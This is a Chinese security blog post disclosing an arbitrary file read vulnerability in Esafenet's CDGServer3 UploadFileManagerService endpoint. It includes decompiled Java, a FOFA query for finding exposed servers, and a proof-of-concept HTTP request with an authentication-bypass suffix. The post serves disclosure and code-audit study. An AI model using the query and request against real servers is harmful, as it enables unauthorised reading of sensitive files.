---
title: "亿赛通-电子文档安全管理系统 UploadFileManagerService 任意文件读取漏洞"
source: https://mrxn.net/jswz/CDGServer3-document-UploadFileManagerService-fileread.html
asset_dir: assets/亿赛通-电子文档安全管理系统-uploadfilemanagerservice-任意文件读取漏洞
---

# 亿赛通-电子文档安全管理系统 UploadFileManagerService 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/2 10:18
- 795浏览
- [0评论](#comment)
- 21分钟阅读

深入探索

Server

软件

sql

---

# 漏洞简介

亿赛通电子文档安全管理系统的 UploadFileManagerService 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。攻击者可通过构造特定请求，利用该接口的文件路径参数读取服务器上的任意文件内容，从而获取敏感信息，影响范围包括系统配置文件、用户数据等，支持远程利用。

Windows安全工具

# 影响版本

# fofa语法

> app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"

# 漏洞分析

PS: 相关权限绕过简析参考[亿赛通电子文档安全管理系统 AppExamList.jsp SQL注入漏洞](https://mrxn.net/jswz/esafenet-AppExamList-sqli.html)

看本次出现漏洞的方法actionViewUploadFile

```
public class UploadFileManagerService extends WebController {
    UploadFileManagerModel model = new UploadFileManagerModel();

    public void actionViewUploadFile(HttpServletRequest request, HttpServletResponse response) throws Exception {
        request.setCharacterEncoding("GBK");
        String fromurl = request.getParameter("fromurl");
        String filePath = new String(request.getParameter("filePath").getBytes("ISO8859_1"), "GBK");
        String fileName1 = new String(request.getParameter("fileName1").getBytes("ISO8859_1"), "GBK");
        if (filePath.indexOf("../") <= 0 && filePath.indexOf("..") <= 0) {
            String configfilepath = Constant.instance.LOGMANAGERPATH.replace("/", "").replace("\\", "");
            String newfilepath = filePath.replace("/", "").replace("\\", "");
            if (filePath != null && newfilepath.indexOf(configfilepath) >= 0 && filePath.indexOf("%") <= 0 && filePath.indexOf("CDocGuard Server") <= 0 && filePath.indexOf("CDocGuard%20Server") <= 0) {
                if ((new File(filePath)).exists()) {
                    CDGUtil.downFile(filePath, response, fileName1);
                } else {
                    request.setAttribute("prompt", "文件正在上传中或已经被删除!");
                    request.getRequestDispatcher(fromurl).forward(request, response);
                }
```

又是熟悉的`CDGUtil.downFile`方法调用

漏洞预警服务

[![亿赛通-电子文档安全管理系统 UploadFileManagerService 任意文件读取漏洞](images/img-001-5132f7ecb49f.webp)](https://image.mrxn.net/3bc605bae8e04b4892aebb4ed12f65b5.webp)

参数**filePath**被直接用于文件操作，无过滤或校验导致任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

同时该处还存在任意文件删除漏洞和sql注入漏洞

计算机服务器

[![亿赛通-电子文档安全管理系统 UploadFileManagerService 任意文件读取漏洞](images/img-002-870e310f0abd.webp)](https://image.mrxn.net/7a3e77d4927b4de1a9891c763237feae.webp)

UploadFileManagerDao的update方法分析可参考[亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://mrxn.net/jswz/CDGServer3-client-DecryptApplication-sqli.html)

# 漏洞复现

```
POST /CDGServer3/document/UploadFileManagerService;Servicelogin HTTP/1.1
Host: CDGServer3.mrxn.net
Content-Type: application/x-www-form-urlencoded

command=ViewUploadFile&filePath=FILE_READ_POC&fileName1=1.png&fromurl=/frame.jsp
```

[![亿赛通-电子文档安全管理系统 UploadFileManagerService 任意文件读取漏洞](images/img-003-c58a2673a6ce.webp)](https://image.mrxn.net/83b4e4f3034145cf8b63cf6dd23a32ca.webp)

成功读取到C:/Windows/win.ini文件内容

Windows安全工具

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#sqlmap](https://mrxn.net/tag/sqlmap)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
